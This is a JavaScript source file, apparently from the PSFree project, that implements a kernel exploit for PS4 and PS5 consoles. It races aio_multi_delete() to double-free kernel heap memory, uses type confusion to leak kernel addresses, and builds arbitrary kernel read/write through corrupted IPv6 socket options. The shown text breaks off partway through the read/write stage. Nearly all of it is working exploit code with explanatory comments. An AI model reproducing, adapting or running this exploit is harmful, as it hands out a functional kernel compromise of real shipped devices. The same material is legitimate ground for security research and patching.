/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;
// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;
// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;
const sizeof_cpuset_t_ = 16;
// CONFIG CONSTANTS
const main_core = 7;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = 100;
const num_races = 100;
const leak_len = 16;
const num_clobbers = 8;

function poll_aio(ids, states, num_ids=ids.length) {
  if (states !== undefined) {
    states = states.addr;
  }
  aio_multi_poll(ids.addr, num_ids, states);
}

function free_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function free_aios2(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function get_cpu_affinity(mask) {
  sysi(
    'cpuset_getaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function set_cpu_affinity(mask) {
  sysi(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function pin_to_core(core) {
  const mask = new Buffer(sizeof_cpuset_t_);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}

function get_core_index(mask) {
  var num = mem.read32(mask.addr);
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function get_current_core() {
  const mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_current_rtprio() {
  const _rtprio = new Buffer(4);
  sysi('rtprio_thread', RTP_LOOKUP, 0, _rtprio.addr);
  return {
    type: _rtprio.read16(0),
    prio: _rtprio.read16(2),
  };
}

function set_rtprio(rtprio_obj) {
  const _rtprio = new Buffer(4);
  _rtprio.write16(0, rtprio_obj.type);
  _rtprio.write16(2, rtprio_obj.prio);
  sysi('rtprio_thread', RTP_SET, 0, _rtprio.addr);
}

function close(fd) {
  sysi('close', fd);
}

function new_socket() {
  return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
  return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }
  sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
  return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
  sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
  if (optlen === undefined) {
    optlen = optval.size;
  }

  const addr = optval.addr;
  setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
  return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
  ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
  }
}

function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;
  buf[0] = 0;
  buf[1] = len;
  buf[2] = 0;
  buf[3] = len >> 1;
  return size;
}

function spawn_thread(thread) {
  const off_context_size = 0xc8;
  const ctx = new Buffer(off_context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  // pivot the pthread's stack pointer to our stack
  ctx.write64(0x38, thread.stack_addr);
  ctx.write64(0x80, thread.get_gadget('ret'));
  call_nze(
    'pthread_create',
    pthread.addr,
    0,
    chain.get_gadget('setcontext'),
    ctx.addr
  );
  return pthread;
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE =============================================
//================================================================================================
function make_aliased_rthdrs(sds) {
  const marker_offset = 4;
  const size = 0x80;
  const buf = new Buffer(size);
  const rsize = build_rthdr(buf, size);
  for (var loop = 0; loop < num_alias; loop++) {
    for (var i = 0; i < num_sds; i++) {
      buf.write32(marker_offset, i);
      set_rthdr(sds[i], buf, rsize);
    }
    for (var i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(marker_offset);
      if (marker !== i) {
        //log(`aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}
// summary of the bug at aio_multi_delete():
//void free_queue_entry(struct aio_entry *reqs2) {
//  if (reqs2->ar2_spinfo != NULL) {
//    printf(
//      "[0]%s() line=%d Warning !! split info is here\n",
//      __func__,
//      __LINE__
//    );
//  }
//  if (reqs2->ar2_file != NULL) {
//    // we can potentially delay .fo_close()
//    fdrop(reqs2->ar2_file, curthread);
//    reqs2->ar2_file = NULL;
//  }
//  free(reqs2, M_AIO_REQS2);
//}
//int _aio_multi_delete(
//  struct thread *td,
//  SceKernelAioSubmitId ids[],
//  u_int num_ids,
//  int sce_errors[]) {
//  // ...
//  struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//  // ...
//  u_int rem_ids = obj->ao_rem_ids;
//  if (rem_ids != 1) {
//    // BUG: wlock not acquired on this path
//    obj->ao_rem_ids = --rem_ids;
//    // ...
//    free_queue_entry(obj->ao_entries[req_idx]);
//    // the race can crash because of a NULL dereference since this path
//    // doesn't check if the array slot is NULL so we delay
//    // free_queue_entry()
//    obj->ao_entries[req_idx] = NULL;
//  } else {
//    // ...
//  }
//  // ...
//}
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
  const sce_errs = new View4([-1, -1]);
  const thr_mask = new Word(1 << main_core);
  const thr = racer;
  thr.push_syscall(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    8,
    thr_mask.addr
  );
  thr.push_syscall('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
  thr.push_gadget('pop rax; ret');
  thr.push_value(1);
  thr.push_get_retval();
  thr.push_call('pthread_barrier_wait', barrier.addr);
  thr.push_syscall(
    'aio_multi_delete',
    request_addr,
    1,
    sce_errs.addr_at(1)
  );
  thr.push_call('pthread_exit', 0);
  const pthr = spawn_thread(thr);
  const thr_tid = pthr.read32(0);
  // pthread barrier implementation:
  // given a barrier that needs N threads for it to be unlocked, a thread
  // will sleep if it waits on the barrier and N - 1 threads havent't arrived
  // before
  // if there were already N - 1 threads then that thread (last waiter) won't
  // sleep and it will send out a wake-up call to the waiting threads
  // since the ps4's cores only have 1 hardware thread each, we can pin 2
  // threads on the same core and control the interleaving of their
  // executions via controlled context switches
  // wait for the worker to enter the barrier and sleep
  while (thr.retval_int === 0) {
    sys_void('sched_yield');
  }
  // enter the barrier as the last waiter
  chain.push_call('pthread_barrier_wait', barrier.addr);
  // yield and hope the scheduler runs the worker next. the worker will then
  // sleep at soclose() and hopefully we run next
  chain.push_syscall('sched_yield');
  // if we get here and the worker hasn't been reran then we can delay the
  // worker's execution of soclose() indefinitely
  chain.push_syscall('thr_suspend_ucontext', thr_tid);
  chain.push_get_retval();
  chain.push_get_errno();
  chain.push_end();
  chain.run();
  chain.reset();
  const main_res = chain.retval_int;
  //log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
  if (main_res === -1) {
    call_nze('pthread_join', pthr, 0);
    //log();
    return null;
  }
  var won_race = false;
  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    //log(`poll: ${hex(poll_err[0])}`);
    const info_buf = new View1(size_tcp_info);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    //log(`info size: ${hex(info_size)}`);
    if (info_size !== size_tcp_info) {
      die(`info size isn't ${size_tcp_info}: ${info_size}`);
    }
    const tcp_state = info_buf[0];
    //log(`tcp_state: ${tcp_state}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
      && tcp_state !== TCPS_ESTABLISHED
    ) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      won_race = true;
    }
  } finally {
    //log('resume thread\n');
    sysi('thr_resume_ucontext', thr_tid);
    call_nze('pthread_join', pthr, 0);
  }
  if (won_race) {
    //log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    // if the code has no bugs then this isn't possible but we keep the
    // check for easier debugging
    if (sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad won_race');
      die('ERROR: bad won_race');
    }
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x80 malloc zone pointers aliased
    return make_aliased_rthdrs(sds);
  }
  return null;
}
//================================================================================================
// STAGE DOUBLE FREE AIO QUEUE ENTRY =============================================================
//================================================================================================
function double_free_reqs2(sds) {
  function swap_bytes(x, byte_length) {
    var res = 0;
    for (var i = 0; i < byte_length; i++) {
      res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
    }
    return res >>> 0;
  }
  function htons(x) {
    return swap_bytes(x, 2);
  }
  function htonl(x) {
    return swap_bytes(x, 4);
  }
  const server_addr = new Buffer(16);
  // sockaddr_in.sin_family
  server_addr[1] = AF_INET;
  // sockaddr_in.sin_port
  server_addr.write16(2, htons(5050));
  // sockaddr_in.sin_addr = 127.0.0.1
  server_addr.write32(4, htonl(0x7f000001));
  const racer = new Chain();
  const barrier = new Long();
  call_nze('pthread_barrier_init', barrier.addr, 0, 2);
  const num_reqs = 3;
  const which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs);
  const reqs1_p = reqs1.addr;
  const aio_ids = new View4(num_reqs);
  const aio_ids_p = aio_ids.addr;
  const req_addr = aio_ids.addr_at(which_req);
  const cmd = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));
  sysi('bind', sd_listen, server_addr.addr, server_addr.size);
  sysi('listen', sd_listen, 1);
  for (var i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi('connect', sd_client, server_addr.addr, server_addr.size);
    const sd_conn = sysi('accept', sd_listen, 0, 0);
    // force soclose() to sleep
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);
    aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
    aio_multi_cancel(aio_ids_p, num_reqs);
    aio_multi_poll(aio_ids_p, num_reqs);
    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    close(sd_client);
    const res = race_one(req_addr, sd_conn, barrier, racer, sds);
    racer.reset();
    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    aio_multi_delete(aio_ids_p, num_reqs);
    close(sd_conn);
    if (res !== null) {
      window.log(` - Won race at attempt: ${i}`);
      close(sd_listen);
      call_nze('pthread_barrier_destroy', barrier.addr);
      return res;
    }
  }
  die('failed aio double free');
}
//================================================================================================
// FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS ===========================================
//================================================================================================
function new_evf(flags) {
  const name = cstr('');
  // int evf_create(char *name, uint32_t attributes, uint64_t flags)
  return sysi('evf_create', name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
  sysi('evf_clear', id, 0);
  sysi('evf_set', id, flags);
}

function free_evf(id) {
  sysi('evf_delete', id);
}

function verify_reqs2(buf, offset) {
  // reqs2.ar2_cmd
  if (buf.read32(offset) !== AIO_CMD_WRITE) {
    return false;
  }
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  // check if offsets 0x10 to 0x20 look like a kernel heap address
  for (var i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(buf.read16(offset + i + 4));
  }
  // check reqs2.ar2_result.state
  // state is actually a 32-bit value but the allocated memory was
  // initialized with zeros. all padding bytes must be 0 then
  const state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
    return false;
  }
  // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
  // aio_submit_cmd()
  if (!buf.read64(offset + 0x40).eq(0)) {
    return false;
  }
  // check if offsets 0x48 to 0x50 look like a kernel address
  for (var i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      // don't push kernel ELF addresses
      if (buf.read16(offset + i + 4) !== 0xffff) {
        heap_prefixes.push(buf.read16(offset + i + 4));
      }
      // offset 0x48 can be NULL
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
      return false;
    }
  }
  return heap_prefixes.every((e, i, a) => e === a[0]);
}
//================================================================================================
// STAGE LEAK KERNEL ADDRESSES ===================================================================
//================================================================================================
function leak_kernel_addrs(sd_pair) {
  close(sd_pair[1]);
  const sd = sd_pair[0];
  const buf = new Buffer(0x80 * leak_len);
  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  //log('confuse evf with rthdr');
  var evf = null;
  for (var i = 0; i < num_alias; i++) {
    const evfs = [];
    for (var j = 0; j < num_handles; j++) {
      evfs.push(new_evf(0xf00 | (j << 16)));
    }
    get_rthdr(sd, buf, 0x80);
    // for simplicity, we'll assume i < 2**16
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];
    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);
    // double check with Al-Azif
    if (buf.read32(0) === (flags32 | 1)) {
      evfs.splice(flags32 >> 16, 1);
    } else {
      evf = null;
    }
    for (const evf of evfs) {
      free_evf(evf);
    }
    if (evf !== null) {
      //log(`confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }
  if (evf === null) {
    die('failed to confuse evf and rthdr');
  }
  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);
  // fields we use from evf (number before the field is the offset in hex):
  // struct evf:
  //     0 u64 flags
  //     28 struct cv cv
  //     38 TAILQ_HEAD(struct evf_waiter) waiters
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  const kernel_addr = buf.read64(0x28);
  //log(`"evf cv" string addr: ${kernel_addr}`);
  // because of TAILQ_INIT(), we have:
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  // we now know the address of the kernel buffer we are leaking
  const kbuf_addr = buf.read64(0x40).sub(0x38);
  //log(`kernel buffer addr: ${kbuf_addr}`);
  // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
  // allocate reqs1 arrays at 0x100 malloc zone
  const num_elems = 6;
  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  const ucred = kbuf_addr.add(4);
  const leak_reqs = make_reqs1(num_elems);
  const leak_reqs_p = leak_reqs.addr;
  leak_reqs.write64(0x10, ucred);
  const leak_ids_len = num_handles * num_elems;
  const leak_ids = new View4(leak_ids_len);
  const leak_ids_p = leak_ids.addr;
  const num_leaks_kernel = 30;
  //log('find aio_entry');
  var reqs2_off = null;
  var found = 0;
  var found_off = 0;
  for (var i = 0; (i < num_leaks_kernel) && !found; i++) {
    get_rthdr(sd, buf);
    spray_aio(
      num_handles,
      leak_reqs_p,
      num_elems,
      leak_ids_p,
      true,
      AIO_CMD_WRITE
    );
    get_rthdr(sd, buf);
    for (var off = 0x80; off < buf.length; off += 0x40) {
      if (verify_reqs2(buf, off)) {
        found_off = off;
        found = true;
        window.log(` - Found reqs2 at attempt: ${i}`);
        break;
      }
    }
    if (!found) {
      free_aios(leak_ids_p, leak_ids_len);
    }
  }
  if (found) {
    reqs2_off = found_off;
  }
  if (reqs2_off === null) {
    die('could not leak a reqs2');
  }
  //log(`reqs2 offset: ${hex(reqs2_off)}`);
  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  //log('leaked aio_entry:');
  //hexdump(reqs2);
  const reqs1_addr = new Long(reqs2.read64(0x10));
  //log(`reqs1_addr: ${reqs1_addr}`);
  reqs1_addr.lo &= -0x100;
  //log(`reqs1_addr: ${reqs1_addr}`);
  //log('searching target_id');
  var target_id = null;
  var to_cancel_p = null;
  var to_cancel_len = null;
  for (var i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
    get_rthdr(sd, buf);
    const state = buf.read32(reqs2_off + 0x38);
    if (state === AIO_STATE_ABORTED) {
      window.log(` - Found target_id at batch: ${i / num_elems}`);
      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      //log(`target_id: ${hex(target_id)}`);
      const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
      //log('leaked aio_entry:');
      //hexdump(reqs2);
      const start = i + num_elems;
      to_cancel_p = leak_ids.addr_at(start);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    die('target_id not found');
  }
  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios2(leak_ids_p, leak_ids_len);
  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE ============================================
//================================================================================================
function make_aliased_pktopts(sds) {
  const tclass = new Word();
  const pktopts_loopcnt = 1;
  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
    for (var i = 0; i < num_sds; i++) {
      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    for (var i = 0; i < num_sds; i++) {
      tclass[0] = i;
      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
    }
    for (var i = 0; i < sds.length; i++) {
      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        window.log(` - Aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        // add pktopts to the new sockets now while new allocs can't
        // use the double freed memory
        for (var j = 0; j < 2; j++) {
          const sd = new_socket();
          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
          sds.push(sd);
        }
        return pair;
      }
    }
  }
  die('failed to make aliased pktopts');
}
//================================================================================================
// STAGE DOUBLE FREE SceKernelAioRWRequest =======================================================
//================================================================================================
function double_free_reqs1(
  reqs1_addr, kbuf_addr, target_id, evf, sd, sds
) {
  const max_leak_len = (0xff + 1) << 3;
  const buf = new Buffer(max_leak_len);
  const num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems);
  const aio_reqs_p = aio_reqs.addr;
  const num_batches = 2;
  const aio_ids_len = num_batches * num_elems;
  const aio_ids = new View4(aio_ids_len);
  const aio_ids_p = aio_ids.addr;
  //log('start overwrite rthdr with AIO queue entry loop');
  var aio_not_found = true;
  free_evf(evf);
  for (var i = 0; i < num_clobbers; i++) {
    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      //log(`aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids_len);
      break;
    }
    free_aios(aio_ids_p, aio_ids_len);
  }
  if (aio_not_found) {
    die('failed to overwrite rthdr');
  }
  const reqs2 = new Buffer(0x80);
  const rsize = build_rthdr(reqs2, reqs2.size);
  // .ar2_ticket
  reqs2.write32(4, 5);
  // .ar2_info
  reqs2.write64(0x18, reqs1_addr);
  // craft a aio_batch using the end portion of the buffer
  const reqs3_off = 0x28;
  // .ar2_batch
  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
  // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
  // safe since free_queue_entry() doesn't deref the pointer
  reqs2.write32(reqs3_off, 1);
  reqs2.write32(reqs3_off + 4, 0);
  // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
  reqs2[reqs3_off + 0xc] = 0;
  // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
  // safe since the entry already got dequeued
  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
  // .ar3_lock.lk_lock = LK_UNLOCKED
  reqs2.write64(reqs3_off + 0x38, 1);
  const states = new View4(num_elems);
  const states_p = states.addr;
  const addr_cache = [aio_ids_p];
  for (var i = 1; i < num_batches; i++) {
    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
  }
  //log('start overwrite AIO queue entry with rthdr loop');
  var req_id = null;
  close(sd);
  sd = null;
  loop: for (var i = 0; i < num_alias; i++) {
    for (const sd of sds) {
      set_rthdr(sd, reqs2, rsize);
    }
    for (var batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states_p);
      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        //log(`req_idx: ${req_idx}`);
        //log(`found req_id at batch: ${batch}`);
        //log(`states: ${[...states].map(e => hex(e))}`);
        //log(`states[${req_idx}]: ${hex(states[req_idx])}`);
        //log(`aliased at attempt: ${i}`);
        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        //log(`req_id: ${hex(req_id)}`);
        aio_ids[aio_idx] = 0;
        // set .ar3_done to 1
        poll_aio(req_id, states);
        //log(`states[${req_idx}]: ${hex(states[0])}`);
        for (var j = 0; j < num_sds; j++) {
          const sd2 = sds[j];
          get_rthdr(sd2, reqs2);
          const done = reqs2[reqs3_off + 0xc];
          if (done) {
            //hexdump(reqs2);
            sd = sd2;
            sds.splice(j, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (sd === null) {
          die("can't find sd that overwrote AIO queue entry");
        }
        //log(`sd: ${sd}`);
        break loop;
      }
    }
  }
  if (req_id === null) {
    die('failed to overwrite AIO queue entry');
  }
  free_aios2(aio_ids_p, aio_ids_len);
  // enable deletion of target_id
  poll_aio(target_id, states);
  //log(`target's state: ${hex(states[0])}`);
  const sce_errs = new View4([-1, -1]);
  const target_ids = new View4([req_id, target_id]);
  // PANIC: double free on the 0x100 malloc zone. important kernel data may
  // alias
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    //log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    states[0] = -1;
    states[1] = -1;
    poll_aio(target_ids, states);
    //log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    var success = true;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
      //log('ERROR: bad delete of corrupt AIO request');
      success = false;
    }
    if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad delete of ID pair');
      success = false;
    }
    if (!success) {
      die('ERROR: double free on a 0x100 malloc zone failed');
    }
  }
}
//================================================================================================
// STAGE GET ARBITRARY KERNEL READ/WRITE =========================================================
//================================================================================================
// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  const psd = pktopts_sds[0];
  const tclass = new Word();
  const off_tclass = is_ps4 ? 0xb0 : 0xc0;
  const pktopts = new Buffer(0x100);
  const rsize = build_rthdr(pktopts, pktopts.size);
  const pktinfo_p = k100_addr.add(0x10);
  // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
  pktopts.write64(0x10, pktinfo_p);
  //log('overwrite main pktopts');
  var reclaim_sd = null;
  close(pktopts_sds[1]);
  for (var i = 0; i < num_alias; i++) {
    for (var j = 0; j < num_sds; j++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      pktopts.write32(off_tclass, 0x4141 | (j << 16));
      set_rthdr(sds[j], pktopts, rsize);
    }
    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    const marker = tclass[0];
    if ((marker & 0xffff) === 0x4141) {
      window.log(` - Found reclaim sd at attempt: ${i}`);
      const idx = marker >>> 16;
      reclaim_sd = sds[idx];
      sds.splice(idx, 1);
      break;
    }
  }
  if (reclaim_sd === null) {
    die('failed to overwrite main pktopts');
  }
  const pktinfo = new Buffer(0x14);
  pktinfo.write64(0, pktinfo_p);
  const nhop = new Word();
  const nhop_p = nhop.addr;
  const read_buf = new Buffer(8);
  const read_buf_p = read_buf.addr;
  function kread64(addr) {
    const len = 8;
    var offset = 0;
    while (offset < len) {
      // pktopts.ip6po_pktinfo = addr + offset
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = len - offset;
      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi(
        'getsockopt',
        psd, IPPROTO_IPV6, IPV6_NEXTHOP,
        read_buf_p.add(offset), nhop_p
      );
      const n = nhop[0];
      if (n === 0) {
        read_buf[offset] = 0;
        offset += 1;
      } else {
        offset += n;
      }
    }
    return read_buf.read64(0);
  }
  const ka = kread64(kernel_addr);
  //log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
  const kstr = jstr(read_buf);
  //log(`*(&"evf cv"): ${kstr}`);
  if (kstr !== 'evf cv') {
    die('test read of &"evf cv" failed');
  }
  const kbase = kernel_addr.sub(off_kstr);
  //log(`kernel base: ${kbase}`);
  //log('\nmaking arbitrary kernel read/write');
  const cpuid = 7 - main_core;
  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
  //log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
  const pcpu = kread64(pcpu_p);
  //log(`pcpu: ${pcpu}`);
  //log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
  // __pcpu[cpuid].pc_curthread
  const td = kread64(pcpu);
  //log(`td: ${td}`);
  const off_td_proc = 8;
  const proc = kread64(td.add(off_td_proc));
  //log(`proc: ${proc}`);
  const pid = sysi('getpid');
  //log(`our pid: ${pid}`);
  const pid2 = kread64(proc.add(0xb0)).lo;
  //log(`suspected proc pid: ${pid2}`);
  if (pid2 !== pid) {
    die('process not found');
  }
  const off_p_fd = 0x48;
  const p_fd = kread64(proc.add(off_p_fd));
